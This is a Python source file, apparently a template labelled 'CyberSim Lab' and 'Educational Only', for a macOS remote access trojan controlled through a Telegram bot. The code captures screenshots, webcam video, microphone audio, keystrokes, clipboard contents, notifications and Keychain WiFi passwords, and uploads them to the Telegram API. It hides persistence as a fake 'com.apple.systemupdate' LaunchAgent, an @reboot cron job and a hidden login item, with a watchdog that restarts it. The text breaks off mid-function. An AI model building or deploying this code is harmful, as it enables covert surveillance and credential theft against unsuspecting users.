#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberSim Lab - TELEGRAM BOT C2 v5.0 macOS (Educational Only)

macOS-SPECIFIC FEATURES:
  - Screenshot (screencapture), Webcam (imagesnap/ffmpeg avfoundation)
  - Keylogger (pynput), Mic Recording (ffmpeg/sox/rec)
  - Clipboard (pbpaste), WiFi (airport/security), System Info (sw_vers)
  - AUTO-INSTALL all dependencies (pip3)
  - LaunchAgent persistence
  - Cron job persistence
  - Login Items persistence (osascript)
  - Start/Stop notifications to Telegram
  - Watchdog process monitoring

Usage:
  python3 rat_macos_template.py                # Normal mode
  python3 rat_macos_template.py --install      # Full stealth setup
  python3 rat_macos_template.py --uninstall    # Remove persistence
  python3 rat_macos_template.py --status       # Check status
  python3 rat_macos_template.py --daemon       # Run as background daemon
  python3 rat_macos_template.py --watchdog     # Run watchdog monitor
"""

import os, sys, time, subprocess, threading, signal, tempfile, atexit, shutil
from datetime import datetime

_MAIN_DAEMON = False
BOT_TOKEN = '__BOT_TOKEN__'
ADMIN_CHAT_ID = __CHAT_ID__
POLL_INTERVAL = 2
VERSION = "5.0"
PLATFORM = "macOS"
SCRIPT_PATH = os.path.abspath(__file__)
WORKSPACE = os.path.join(os.path.expanduser('~'), "Library", "Application Support", ".rat_tg_workspace")
KEYLOG_FILE = os.path.join(WORKSPACE, "keylogs.txt")
PID_FILE = os.path.join(WORKSPACE, "daemon.pid")
WATCHDOG_PID_FILE = os.path.join(WORKSPACE, "watchdog.pid")
LOG_FILE = os.path.join(WORKSPACE, "daemon.log")
BACKUP_DIR = os.path.join(os.path.expanduser('~'), "Library", "Application Support", ".system_update")
LAUNCH_AGENT_DIR = os.path.expanduser("~/Library/LaunchAgents/")
LAUNCH_AGENT_PATH = os.path.join(LAUNCH_AGENT_DIR, "com.apple.systemupdate.plist")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"

os.makedirs(WORKSPACE, exist_ok=True)


# ============================================================
# ANSI COLOR CLASS
# ============================================================
class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    CY = '\033[96m'
    W = '\033[97m'
    BD = '\033[1m'
    DM = '\033[2m'
    RS = '\033[0m'


# ============================================================
# UTILITY FUNCTIONS
# ============================================================
def log(msg, color=None):
    ts = datetime.now().strftime('%H:%M:%S')
    line = f"[{ts}] {msg}"
    try:
        if color:
            print(f"{color}{line}{C.RS}")
        else:
            print(line)
    except Exception:
        pass
    try:
        with open(LOG_FILE, 'a', encoding='utf-8', errors='ignore') as f:
            f.write(line + "\n")
    except Exception:
        pass


def _safe_remove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception:
        pass


def _safe_rmtree(path):
    try:
        if os.path.exists(path):
            shutil.rmtree(path, ignore_errors=True)
    except Exception:
        pass


def is_admin():
    """Check if running as root on macOS"""
    try:
        return os.geteuid() == 0
    except Exception:
        return False


def run_cmd(cmd, shell=False):
    """Execute shell command and return output"""
    try:
        result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)


req_lib = None


def ensure_requests():
    global req_lib
    if req_lib:
        return True
    try:
        import requests
        req_lib = requests
        return True
    except ImportError:
        log("requests missing, installing...", C.Y)
        for cmd in [
            f"{sys.executable} -m pip install requests --quiet --break-system-packages",
            "pip3 install requests --quiet",
            "python3 -m pip install requests --quiet"
        ]:
            try:
                if subprocess.run(cmd, shell=True, capture_output=True, timeout=120).returncode == 0:
                    import requests
                    req_lib = requests
                    log("requests installed!", C.G)
                    return True
            except Exception:
                pass
        log("requests FAILED!", C.R)
        return False


# ============================================================
# INSTANCE LOCK (PID-based)
# ============================================================
def acquire_instance_lock():
    """Single instance check using PID file + os.kill"""
    try:
        if os.path.exists(PID_FILE):
            with open(PID_FILE, 'r') as f:
                old_pid = int(f.read().strip())
            try:
                os.kill(old_pid, 0)
                return False
            except OSError:
                pass
    except Exception:
        pass
    return True


def release_instance_lock():
    _safe_remove(PID_FILE)


# ============================================================
# TELEGRAM API WRAPPERS
# ============================================================
def send_telegram(text, parse_mode=None):
    """Send message to admin via Telegram"""
    if not ensure_requests():
        return
    try:
        payload = {"chat_id": ADMIN_CHAT_ID, "text": text}
        if parse_mode:
            payload["parse_mode"] = parse_mode
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                payload["text"] = text[i:i + 4000]
                req_lib.post(f"{API}/sendMessage", json=payload, timeout=10)
        else:
            req_lib.post(f"{API}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        log(f"Send error: {e}", C.R)


def send_file(filepath, caption=""):
    """Send file to admin via Telegram"""
    if not ensure_requests():
        return
    try:
        if not os.path.exists(filepath):
            send_telegram(f"File not found: {filepath}")
            return
        sz = os.path.getsize(filepath)
        if sz > 50 * 1024 * 1024:
            send_telegram(f"File too large ({sz / (1024 * 1024):.1f}MB). Max 50MB.")
            return
        with open(filepath, 'rb') as f:
            data = {"chat_id": ADMIN_CHAT_ID}
            if caption:
                data["caption"] = caption
            req_lib.post(f"{API}/sendDocument", data=data, files={"document": f}, timeout=120)
    except Exception as e:
        send_telegram(f"File send error: {e}")


def send_photo(path, cap=""):
    """Send photo to admin via Telegram"""
    if not ensure_requests():
        return
    try:
        if not os.path.exists(path):
            send_telegram(f"Photo not found: {path}")
            return
        with open(path, 'rb') as f:
            data = {"chat_id": ADMIN_CHAT_ID}
            if cap:
                data["caption"] = cap
            req_lib.post(f"{API}/sendPhoto", data=data, files={"photo": f}, timeout=30)
    except Exception as e:
        send_telegram(f"Photo error: {e}")


def tg_send_text(chat_id, text, parse_mode=None):
    if not ensure_requests():
        return
    try:
        payload = {"chat_id": chat_id, "text": text}
        if parse_mode:
            payload["parse_mode"] = parse_mode
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                payload["text"] = text[i:i + 4000]
                req_lib.post(f"{API}/sendMessage", json=payload, timeout=10)
        else:
            req_lib.post(f"{API}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        log(f"Send error: {e}", C.R)


def tg_send_file(chat_id, file_type, file_path, caption="", timeout=60, extra=None):
    if not ensure_requests():
        return
    try:
        sz = os.path.getsize(file_path)
        if file_type in ("video", "voice") and sz > 50 * 1024 * 1024:
            tg_send_text(chat_id, f"File too large ({sz / (1024 * 1024):.1f}MB).")
            return
        data = {"chat_id": chat_id, "caption": caption}
        if extra:
            data.update(extra)
        with open(file_path, 'rb') as f:
            req_lib.post(f"{API}/send{file_type.capitalize()}", data=data, files={file_type: f}, timeout=timeout)
    except Exception as e:
        tg_send_text(chat_id, f"{file_type} error: {e}")


def tg_send_photo(c, p, cap=""):
    tg_send_file(c, "photo", p, cap, timeout=30)


def tg_send_document(c, p, cap=""):
    tg_send_file(c, "document", p, cap, timeout=120)


def tg_send_video(c, p, cap=""):
    tg_send_file(c, "video", p, cap, timeout=120, extra={"supports_streaming": "true"})


def tg_send_voice(c, p, cap=""):
    tg_send_file(c, "voice", p, cap, timeout=30)


def tg_get_updates(offset=0, timeout=30):
    if not ensure_requests():
        return []
    try:
        return req_lib.get(f"{API}/getUpdates", params={"offset": offset, "timeout": timeout}, timeout=35).json().get("result", [])
    except Exception:
        return []


# ============================================================
# SIGNAL HANDLING
# ============================================================
_shutdown_sent = False


def send_notification_to_admin(text):
    try:
        ensure_requests()
        if req_lib:
            req_lib.post(f"{API}/sendMessage", json={"chat_id": ADMIN_CHAT_ID, "text": text}, timeout=10)
    except Exception:
        pass


def send_shutdown_notification(reason="Process terminated"):
    global _shutdown_sent
    if _shutdown_sent or not _MAIN_DAEMON:
        return
    _shutdown_sent = True
    try:
        send_notification_to_admin(
            f"RAT OFFLINE\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Reason: {reason}\nHost: {os.environ.get('HOSTNAME', '')}\nOS: macOS\nPID: {os.getpid()}"
        )
    except Exception:
        pass
    _safe_remove(PID_FILE)
    release_instance_lock()


def _signal_handler(signum, frame):
    reason = "SIGTERM" if signum == signal.SIGTERM else "SIGINT"
    threading.Thread(target=send_shutdown_notification, args=(reason,), daemon=True).start()
    threading.Thread(target=lambda: (time.sleep(1), os._exit(0)), daemon=True).start()


for sig in (signal.SIGTERM, signal.SIGINT):
    try:
        signal.signal(sig, _signal_handler)
    except Exception:
        pass


def _atexit_handler():
    if _MAIN_DAEMON:
        send_shutdown_notification("Process exit / System shutdown")


atexit.register(_atexit_handler)


# ============================================================
# AUTO INSTALL DEPENDENCIES
# ============================================================
def auto_install_deps():
    """Auto-install required dependencies"""
    log("Auto-installing dependencies...", C.Y)
    deps = ["requests", "pynput", "Pillow"]
    for dep in deps:
        try:
            __import__(dep)
            log(f"  [OK] {dep}", C.G)
        except ImportError:
            log(f"  [!!] {dep} missing, installing...", C.Y)
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", dep, "--quiet", "--break-system-packages"],
                    timeout=120, capture_output=True
                )
                __import__(dep)
                log(f"  [OK] {dep} installed", C.G)
            except Exception:
                try:
                    subprocess.run(
                        [sys.executable, "-m", "pip", "install", dep, "--quiet"],
                        timeout=120, capture_output=True
                    )
                    log(f"  [OK] {dep} installed (fallback)", C.G)
                except Exception:
                    log(f"  [XX] {dep} FAILED", C.R)
    # Check for ffmpeg
    r = subprocess.run("which ffmpeg", shell=True, capture_output=True)
    log(
        ("  [OK] ffmpeg" if r.returncode == 0 else "  [!!] ffmpeg not found (video/mic limited)"),
        C.G if r.returncode == 0 else C.Y
    )
    log("Dependencies ready!", C.G)


# ============================================================
# PID FILE HELPERS
# ============================================================
def _read_pid_file(pf):
    try:
        if os.path.exists(pf):
            with open(pf, 'r') as f:
                return int(f.read().strip())
    except Exception:
        pass
    return None


def _check_pid_alive(pid):
    """Check if a PID is alive using os.kill(pid, 0)"""
    try:
        if pid is None:
            return False
        os.kill(pid, 0)
        return True
    except OSError:
        return False
    except Exception:
        return False


# ============================================================
# BACKGROUND PROCESS SPAWNING
# ============================================================
def _spawn_background(flag):
    """Spawn script in background on macOS"""
    log_path = LOG_FILE
    devnull = open(os.devnull, 'w')
    subprocess.Popen(
        [sys.executable, SCRIPT_PATH, flag],
        stdout=open(log_path, 'a'),
        stderr=open(log_path, 'a'),
        stdin=subprocess.DEVNULL,
        start_new_session=True,
        close_fds=True
    )


# ============================================================
# MACOS-SPECIFIC FUNCTIONS
# ============================================================
def take_screenshot():
    """Take screenshot using macOS screencapture"""
    fname = os.path.join(WORKSPACE, f"ss_{int(time.time())}.png")
    try:
        subprocess.run(["screencapture", "-x", fname], timeout=15, capture_output=True)
        if os.path.exists(fname) and os.path.getsize(fname) > 1000:
            return fname
    except Exception:
        pass
    return None


def take_webcam():
    """Capture webcam image using imagesnap or ffmpeg avfoundation"""
    fname = os.path.join(WORKSPACE, f"cam_{int(time.time())}.jpg")
    try:
        # Method 1: imagesnap
        result = subprocess.run(["which", "imagesnap"], capture_output=True)
        if result.returncode == 0:
            subprocess.run(["imagesnap", "-w", "2", "-q", fname], timeout=15, capture_output=True)
            if os.path.exists(fname) and os.path.getsize(fname) > 1000:
                return fname
    except Exception:
        pass
    try:
        # Method 2: ffmpeg with avfoundation
        subprocess.run(
            ["ffmpeg", "-f", "avfoundation", "-i", "0", "-frames:v", "1", "-y", fname],
            timeout=15, capture_output=True
        )
        if os.path.exists(fname) and os.path.getsize(fname) > 1000:
            return fname
    except Exception:
        pass
    return None


def record_video(duration=5):
    """Record video using ffmpeg avfoundation"""
    fname = os.path.join(WORKSPACE, f"vid_{int(time.time())}.mp4")
    try:
        # Try ffmpeg with avfoundation (video only, no audio prompt)
        subprocess.run(
            ["ffmpeg", "-f", "avfoundation", "-i", "0:0", "-t", str(duration),
             "-r", "15", "-s", "640x480", "-vcodec", "libx264", "-y", fname],
            timeout=duration + 15, capture_output=True
        )
        if os.path.exists(fname) and os.path.getsize(fname) > 1000:
            return fname
    except Exception:
        pass
    try:
        # Fallback: video only (no audio)
        subprocess.run(
            ["ffmpeg", "-f", "avfoundation", "-i", "0", "-t", str(duration),
             "-r", "15", "-s", "640x480", "-y", fname],
            timeout=duration + 15, capture_output=True
        )
        if os.path.exists(fname) and os.path.getsize(fname) > 1000:
            return fname
    except Exception:
        pass
    return None


def get_clipboard():
    """Get clipboard contents using pbpaste"""
    try:
        result = subprocess.run(["pbpaste"], capture_output=True, text=True, timeout=5)
        return result.stdout
    except Exception:
        return "(clipboard access failed)"


def get_wifi_passwords():
    """Get WiFi passwords from macOS Keychain"""
    result_lines = []
    try:
        # Get list of known WiFi networks from networksetup
        hw_ports = subprocess.run(["networksetup", "-listallhardwareports"],
                                  capture_output=True, text=True, timeout=10).stdout
        wifi_devices = []
        for line in hw_ports.split('\n'):
            if 'Wi-Fi' in line or 'AirPort' in line:
                wifi_devices.append(line.split(':')[1].strip() if ':' in line else "")
        # Also try getting from /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist
        plist_path = "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist"
        if os.path.exists(plist_path):
            result_lines.append(f"WiFi prefs found: {plist_path}")
            # Try to read known networks
            try:
                plist_out = subprocess.run(
                    ["defaults", "read", plist_path, "KnownNetworks"],
                    capture_output=True, text=True, timeout=10
                ).stdout
                if plist_out.strip():
                    result_lines.append(f"Known networks:\n{plist_out[:2000]}")
            except Exception:
                pass
        # Try security find-generic-password for WiFi
        try:
            current_wifi = subprocess.run(
                ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I"],
                capture_output=True, text=True, timeout=5
            ).stdout
            ssid_line = [l.strip() for l in current_wifi.split('\n') if 'SSID:' in l]
            if ssid_line:
                ssid = ssid_line[0].split(':')[1].strip()
                pwd = subprocess.run(
                    ["security", "find-generic-password", "-a", ssid, "-s", "AirPort", "-w"],
                    capture_output=True, text=True, timeout=10
                ).stdout.strip()
                result_lines.append(f"Current WiFi: {ssid}")
                result_lines.append(f"Password: {pwd}")
        except Exception:
            pass
        # List WiFi networks
        scan = subprocess.run(
            ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"],
            capture_output=True, text=True, timeout=10
        ).stdout
        if scan.strip():
            result_lines.append(f"\nWiFi Scan:\n{scan[:1500]}")
    except Exception as e:
        result_lines.append(f"Error: {e}")
    return "\n".join(result_lines) if result_lines else "No WiFi data retrieved"


def get_wifi_networks():
    """Get WiFi networks using airport command"""
    airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
    try:
        result = subprocess.run([airport_path, "-s"], capture_output=True, text=True, timeout=10)
        return result.stdout if result.stdout.strip() else "No WiFi networks found"
    except Exception:
        return "airport command failed"


def _save_to_file(fname, content):
    with open(fname, 'w', encoding='utf-8', errors='ignore') as f:
        f.write(content)


# ============================================================
# KEYLOGGER MANAGER
# ============================================================
class KeyloggerManager:
    def __init__(self):
        self.running = False
        self.listener = None
        self.keystroke_count = 0
        self.error_msg = ""
        self.captured_test_key = False

    def start(self):
        try:
            from pynput import keyboard
            log("Keylogger starting...", C.Y)

            def on_press(key):
                try:
                    ch = key.char
                except AttributeError:
                    ch = f"[{key.name}]"
                try:
                    with open(KEYLOG_FILE, 'a', encoding='utf-8', errors='ignore') as f:
                        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {ch}\n")
                except Exception:
                    pass
                self.keystroke_count += 1
                self.captured_test_key = True

            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.daemon = True
            self.listener.start()
            time.sleep(1.0)
            if self.listener.is_alive():
                self.running = True
                log("Keylogger ACTIVE", C.G)
            else:
                self.error_msg = "LISTENER_DIED"
                log("Keylogger died!", C.R)
        except ImportError:
            self.error_msg = "PYNPUT_MISSING"
            log("pynput missing!", C.R)
        except Exception as e:
            self.error_msg = str(e)
            log(f"Keylogger: {e}", C.R)

    def dump(self):
        try:
            if os.path.exists(KEYLOG_FILE):
                with open(KEYLOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()
        except Exception:
            pass
        return ""

    def clear(self):
        try:
            os.remove(KEYLOG_FILE)
            self.keystroke_count = 0
            self.captured_test_key = False
            return True
        except Exception:
            return False

    def get_status_text(self):
        if self.running:
            return "ACTIVE" if self.captured_test_key else "Listening (no keys yet)"
        return {
            "PYNPUT_MISSING": "OFF - pip install pynput",
            "LISTENER_DIED": "OFF - died"
        }.get(self.error_msg, "OFF")


# ============================================================
# MIC RECORDER (macOS: ffmpeg + sox/rec)
# ============================================================
class MicRecorder:
    def __init__(self):
        self.recording = False
        self.thread = None
        self.chunk_count = 0

    def start(self, chat_id):
        if self.recording:
            return "Already recording!"
        self.recording = True
        self.chunk_count = 0
        self.thread = threading.Thread(target=self._loop, args=(chat_id,), daemon=True)
        self.thread.start()
        return "Mic ON! /mic off to stop."

    def stop(self):
        if not self.recording:
            return "Not recording."
        self.recording = False
        return f"Mic OFF! {self.chunk_count} chunks sent."

    def _loop(self, chat_id):
        log("Mic started...", C.G)
        while self.recording:
            wav = os.path.join(WORKSPACE, f"mic_{int(time.time())}.wav")
            ogg = os.path.join(WORKSPACE, f"mic_{int(time.time())}.ogg")
            try:
                ok = False
                # Method 1: rec (sox)
                try:
                    subprocess.run(
                        ["rec", "-r", "16000", "-c", "1", wav, "trim", "0", "10"],
                        timeout=20, capture_output=True
                    )
                    ok = os.path.exists(wav) and os.path.getsize(wav) > 100
                except FileNotFoundError:
                    pass
                except Exception:
                    pass
                # Method 2: ffmpeg with avfoundation audio
                if not ok:
                    try:
                        subprocess.run(
                            ["ffmpeg", "-f", "avfoundation", "-i", ":0", "-t", "10",
                             "-ar", "16000", "-ac", "1", "-y", wav],
                            timeout=20, capture_output=True
                        )
                        ok = os.path.exists(wav) and os.path.getsize(wav) > 100
                    except Exception:
                        pass
                # Convert to ogg for smaller size
                if ok and os.path.exists(wav):
                    subprocess.run(
                        ["ffmpeg", "-i", wav, "-c:a", "libopus", "-b:a", "32k", "-y", ogg],
                        timeout=15, capture_output=True
                    )
                    if not (os.path.exists(ogg) and os.path.getsize(ogg) > 100):
                        ogg = wav
                if ok and self.recording:
                    self.chunk_count += 1
                    tg_send_voice(chat_id, ogg, f"Mic [{self.chunk_count}]")
                elif self.recording and self.chunk_count == 0:
                    tg_send_text(chat_id, "Mic: Cannot access audio device. Install sox: brew install sox")
                    break
            except Exception as e:
                log(f"Mic err: {e}", C.R)
                break
            for f in [ogg, wav]:
                _safe_remove(f)
        log("Mic stopped.", C.Y)


# ============================================================
# NOTIFICATION READER (macOS)
# ============================================================
class NotificationReader:
    def __init__(self):
        self.db_path = os.path.join(
            os.path.expanduser('~'),
            "Library", "Group Containers", "group.com.apple.usernoted",
            "db2", "db"
        )

    def get_notifications(self, count=20):
        """Read macOS notification center database"""
        try:
            # Try reading from notification center sqlite database
            if os.path.exists(self.db_path):
                import sqlite3
                tdb = os.path.join(tempfile.gettempdir(), 'notif_copy.db')
                try:
                    shutil.copy2(self.db_path, tdb)
                except PermissionError:
                    tdb = self.db_path
                try:
                    conn = sqlite3.connect(tdb, timeout=5)
                    conn.text_factory = str
                    cur = conn.cursor()
                    cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
                    tables = [r[0] for r in cur.fetchall()]
                    # Look for notification-related tables
                    notif_tables = [t for t in tables if 'record' in t.lower() or 'notif' in t.lower() or 'app' in t.lower()]
                    if notif_tables:
                        for tbl in notif_tables[:3]:
                            cur.execute(f"SELECT * FROM {tbl} LIMIT {count}")
                            rows = cur.fetchall()
                            if rows:
                                result = f"Notifications ({tbl}) - {len(rows)} found\n{'='*40}\n"
                                for i, row in enumerate(rows):
                                    result += f"[{i + 1}] {str(row)[:300]}\n"
                                result = result[:4000]
                                conn.close()
                                _safe_remove(tdb)
                                return result
                    else:
                        result = f"Tables found: {tables[:10]}\nNo notification table detected."
                    conn.close()
                    _safe_remove(tdb)
                    return result[:4000]
                except Exception as e:
                    _safe_remove(tdb)
                    return f"DB read error: {e}"
            else:
                # Try alternative: log show for recent notifications
                result = subprocess.run(
                    ["log", "show", "--predicate", "subsystem == 'com.apple.UNUserNotificationCenter'",
                     "--last", "1h", "--style", "compact"],
                    capture_output=True, text=True, timeout=15
                )
                if result.stdout.strip():
                    return f"Notification logs (last 1h):\n{result.stdout[:3500]}"
                return f"Notification DB not found\nPath: {self.db_path}"
        except Exception as e:
            return f"Error: {e}"


# ============================================================
# PERSISTENCE (macOS)
# ============================================================
def setup_persistence():
    """Install macOS persistence: LaunchAgent + cron + Login Items + backup"""
    installed = []

    # Method 1: LaunchAgent
    try:
        os.makedirs(LAUNCH_AGENT_DIR, exist_ok=True)
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{SCRIPT_PATH}</string>
        <string>--daemon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>"""
        with open(LAUNCH_AGENT_PATH, 'w') as f:
            f.write(plist_content)
        subprocess.run(["launchctl", "load", LAUNCH_AGENT_PATH], timeout=10, capture_output=True)
        log("  [OK] LaunchAgent", C.G)
        installed.append("LaunchAgent")
    except Exception as e:
        log(f"  [!!] LaunchAgent: {e}", C.Y)

    # Method 2: cron job
    try:
        cron_cmd = f"@reboot {sys.executable} {SCRIPT_PATH} --daemon 2>/dev/null"
        current_crontab = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
        existing = current_crontab.stdout if current_crontab.returncode == 0 else ""
        if SCRIPT_PATH not in existing:
            new_crontab = existing.rstrip() + "\n" + cron_cmd + "\n" if existing else cron_cmd + "\n"
            proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, timeout=10)
            proc.communicate(input=new_crontab.encode())
            log("  [OK] Cron job", C.G)
            installed.append("cron")
        else:
            log("  [--] Cron already set", C.DM)
    except Exception as e:
        log(f"  [!!] Cron: {e}", C.Y)

    # Method 3: Login Items via osascript
    try:
        app_name = "SystemUpdate"
        script = f'tell application "System Events" to make login item at end with properties {{name:"{app_name}", path:"{SCRIPT_PATH}", hidden:true}}'
        # Check if already exists
        check = subprocess.run(
            ["osascript", "-e", f'tell application "System Events" to get the name of every login item'],
            capture_output=True, text=True, timeout=10
        )
        if app_name not in check.stdout:
            subprocess.run(["osascript", "-e", script], timeout=10, capture_output=True)
            log("  [OK] Login Item", C.G)
            installed.append("LoginItem")
        else:
            log("  [--] Login Item exists", C.DM)
    except Exception as e:
        log(f"  [!!] Login Item: {e}", C.Y)

    # Backup script
    try:
        os.makedirs(BACKUP_DIR, exist_ok=True)
        shutil.copy2(SCRIPT_PATH, os.path.join(BACKUP_DIR, "rat_macos.py"))
        log(f"  [OK] Backup: {BACKUP_DIR}", C.G)
    except Exception:
        pass

    return installed


def uninstall_persistence():
    """Remove all persistence mechanisms"""
    results = []

    # Kill daemon and watchdog
    for pf, label in [(PID_FILE, "daemon"), (WATCHDOG_PID_FILE, "watchdog")]:
        try:
            pid = _read_pid_file(pf)
            if pid:
                os.kill(pid, signal.SIGTERM)
                time.sleep(1)
                try:
                    os.kill(pid, signal.SIGKILL)
                except OSError:
                    pass
                results.append(f"Killed {label} PID: {pid}")
        except Exception:
            pass

    # Remove LaunchAgent
    try:
        if os.path.exists(LAUNCH_AGENT_PATH):
            subprocess.run(["launchctl", "unload", LAUNCH_AGENT_PATH], timeout=10, capture_output=True)
            os.remove(LAUNCH_AGENT_PATH)
            results.append("LaunchAgent removed")
    except Exception:
        pass

    # Remove cron job
    try:
        current = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
        if current.returncode == 0 and SCRIPT_PATH in current.stdout:
            lines = [l for l in current.stdout.split('\n') if SCRIPT_PATH not in l]
            new_crontab = '\n'.join(lines).strip() + '\n' if any(l.strip() for l in lines) else ''
            proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, timeout=10)
            proc.communicate(input=new_crontab.encode())
            results.append("Cron removed")
    except Exception:
        pass

    # Remove Login Item
    try:
        subprocess.run(
            ["osascript", "-e", 'tell application "System Events" to delete login item "SystemUpdate"'],
            timeout=10, capture_output=True
        )
        results.append("Login Item removed")
    except Exception:
        pass

    # Clean PID files
    for f in [PID_FILE, WATCHDOG_PID_FILE]:
        _safe_remove(f)

    return results


def show_persistence_status():
    """Check persistence status"""
    status_parts = []
    # LaunchAgent
    la = os.path.exists(LAUNCH_AGENT_PATH)
    status_parts.append(f"LaunchAgent: {'SET' if la else 'NOT SET'}")
    loaded = subprocess.run(
        ["launchctl", "list"],
        capture_output=True, text=True, timeout=5
    ).stdout
    if "com.apple.systemupdate" in loaded:
        status_parts[-1] += " (LOADED)"
    # Cron
    cron = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
    cron_set = cron.returncode == 0 and SCRIPT_PATH in cron.stdout
    status_parts.append(f"Cron: {'SET' if cron_set else 'NOT SET'}")
    # Login Item
    login = subprocess.run(
        ["osascript", "-e", 'tell application "System Events" to get the name of every login item'],
        capture_output=True, text=True, timeout=5
    )
    login_set = "SystemUpdate" in login.stdout
    status_parts.append(f"Login Item: {'SET' if login_set else 'NOT SET'}")
    # Backup
    status_parts.append(f"Backup: {'EXISTS' if os.path.exists(BACKUP_DIR) else 'NOT FOUND'}")
    return "\n".join(status_parts)


# ============================================================
# DAEMON & WATCHDOG
# ============================================================
def watchdog_loop():
    while True:
        try:
            main_pid = _read_pid_file(PID_FILE)
            if main_pid and not _check_pid_alive(main_pid):
                log(f"Watchdog: PID {main_pid} died! Restarting...", C.Y)
                send_notification_to_admin(
                    f"RAT RESTARTED by Watchdog\nPID: {main_pid} (died)\n"
                    f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"Host: {os.environ.get('HOSTNAME', '')}"
                )
                start_daemon_background()
        except Exception as e:
            log(f"Watchdog error: {e}", C.R)
        time.sleep(30)


def start_watchdog():
    try:
        old_pid = _read_pid_file(WATCHDOG_PID_FILE)
        if old_pid and _check_pid_alive(old_pid):
            log(f"  [OK] Watchdog running (PID: {old_pid})", C.G)
            return
        _spawn_background("--watchdog")
        log("  [OK] Watchdog started", C.G)
        time.sleep(1)
    except Exception as e:
        log(f"  [!!] Watchdog: {e}", C.Y)


def run_watchdog():
    with open(WATCHDOG_PID_FILE, 'w') as f:
        f.write(str(os.getpid()))
    log(f"Watchdog PID: {os.getpid()}")
    try:
        watchdog_loop()
    except Exception as e:
        log(f"Watchdog crashed: {e}", C.R)
    _safe_remove(WATCHDOG_PID_FILE)


def start_daemon_background():
    try:
        _spawn_background("--daemon")
        log("  [OK] Daemon started!", C.G)
        time.sleep(3)
        pid = _read_pid_file(PID_FILE)
        if pid:
            if _check_pid_alive(pid):
                log(f"  [OK] Verified PID: {pid}", C.G)
            else:
                log(f"  [!!] Daemon may have crashed", C.Y)
    except Exception as e:
        log(f"  [XX] Daemon fail: {e}", C.R)


def run_as_daemon():
    global _MAIN_DAEMON
    if not acquire_instance_lock():
        log("Daemon: Another instance running! Exiting.", C.Y)
        sys.exit(0)
    _MAIN_DAEMON = True
    with open(PID_FILE, 'w') as f:
        f.write(str(os.getpid()))
    log(f"Daemon PID: {os.getpid()} | Root: {is_admin()} | Lock: ACQUIRED")
    auto_install_deps()
    try:
        TelegramC2().start()
    except Exception as e:
        log(f"Daemon crashed: {e}", C.R)
        send_notification_to_admin(
            f"RAT CRASHED!\nError: {e}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
    _safe_remove(PID_FILE)
    release_instance_lock()


def show_status():
    print(f"{C.BD}CyberSim Lab - STATUS v5.0 (macOS){C.RS}")
    print(f"  Token:  {'SET' if BOT_TOKEN != '__BOT_TOKEN__' else 'NOT SET!'}")
    print(f"  ChatID: {'SET' if ADMIN_CHAT_ID > 0 else 'NOT SET!'}")
    print(f"  Root: {is_admin()} | Python: {sys.executable}")
    print(f"  Script: {SCRIPT_PATH}")
    print(f"  Workspace: {WORKSPACE}")
    for label, pf in [("Daemon", PID_FILE), ("Watchdog", WATCHDOG_PID_FILE)]:
        pid = _read_pid_file(pf)
        running = _check_pid_alive(pid) if pid else False
        print(f"  {label}: {'RUNNING (PID:' + str(pid) + ')' if running else 'NOT RUNNING'}")
    print(f"  Persistence:\n{show_persistence_status()}")
    print(f"  Backup: {os.path.exists(BACKUP_DIR)} | Logs: {os.path.exists(LOG_FILE)}")
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            if lines:
                print(f"\n  Last {min(5, len(lines))} logs:")
                for l in lines[-5:]:
                    print(f"    {l.rstrip()}")
        except Exception:
            pass
    pid = _read_pid_file(PID_FILE)
    print(f"\n{C.G}RAT {'RUNNING' if pid and _check_pid_alive(pid) else 'NOT RUNNING'}{C.RS}")


# ============================================================
# INSTALL STEALTH
# ============================================================
def install_stealth():
    print(f"{C.BD}CyberSim Lab - macOS SETUP v5.0{C.RS}")
    if BOT_TOKEN == '__BOT_TOKEN__' or ADMIN_CHAT_ID <= 0:
        print(f"{C.R}ERROR: Set BOT_TOKEN first!{C.RS}")
        sys.exit(1)
    print(f"  Root: {'YES' if is_admin() else 'NO (limited)'}")

    for i, (desc, fn) in enumerate([
        ("Dependencies", auto_install_deps),
        ("Persistence", setup_persistence)
    ], 1):
